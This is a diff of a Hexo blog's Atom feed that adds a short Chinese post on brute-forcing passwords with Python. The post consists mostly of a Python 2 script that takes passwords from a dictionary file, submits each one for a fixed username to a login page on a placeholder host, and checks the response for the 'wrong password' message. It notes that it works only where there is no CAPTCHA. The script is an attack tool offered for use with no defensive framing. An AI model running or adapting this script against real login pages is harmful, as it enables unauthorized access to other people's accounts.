@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://aiwanxia.github.io/"/>
-  <updated>2017-03-06T04:22:21.539Z</updated>
+  <updated>2017-03-06T04:26:38.816Z</updated>
   <id>https://aiwanxia.github.io/</id>
   
   <author>
@@ -14,6 +14,46 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://aiwanxia.github.io/2017/03/06/python%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"/>
+    <id>https://aiwanxia.github.io/2017/03/06/python进行暴力破解密码/</id>
+    <published>2017-03-06T04:26:38.715Z</published>
+    <updated>2017-03-06T04:26:38.816Z</updated>
+    
+    <content type="html"><![CDATA[<hr>
+<p>title: python进行暴力破解<br>date: 2017-03-05 10:58:52</p>
+<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
+<pre><code>#encoding=utf-8
+import httplib,urllib
+conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)
+f=open(&quot;dict.txt&quot;)
+while 1:
+    pwd=f.readline().strip()
+    if not pwd:
+        print &apos;字典已比对完。&apos;
+        break
+    params = urllib.urlencode({&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd})
+    headers = {&quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;}
+    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)
+    r = conn.getresponse()
+    print r.status, r.reason
+    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理
+    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd
+conn.close()
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;
+&lt;p&gt;title: python进行暴力破解&lt;br&gt;date: 2017-03-05 10:58:52&lt;/p&gt;
+&lt;h2 id=&quot;tags&quot;&gt;&lt;a href=&quot;#tags&quot; class=&quot;headerlink&quot; title=&quot;tags:&quot;&gt;&lt;/a&gt;tags:&lt;/h2&gt;&lt;p
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>利用hexo与nodejs搭建博客</title>
